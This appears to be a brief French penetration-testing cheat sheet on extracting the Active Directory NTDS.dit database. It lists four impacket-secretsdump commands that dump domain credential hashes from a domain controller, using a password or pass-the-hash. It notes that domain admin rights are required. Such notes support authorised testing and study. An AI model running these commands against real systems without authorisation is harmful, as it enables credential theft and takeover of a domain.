# Base NTDS.dit

_**Note :** nécessite les droits "Admins de domaine"._

```
impacket-secretsdump.py <DOMAIN.COM>/Administator:<PASSWORD>@<IP>
impacket-secretsdump administrateur@<DC-IP> -hashes <HASH>
impacket-secretsdump -hashes <HASH-NT:HASH-LM> <DOMAIN.COM>/<USER>@<IP>
impacket-secretsdump -hashes <:HASH-LM> <DOMAIN.COM>/<USER>@<IP>
```
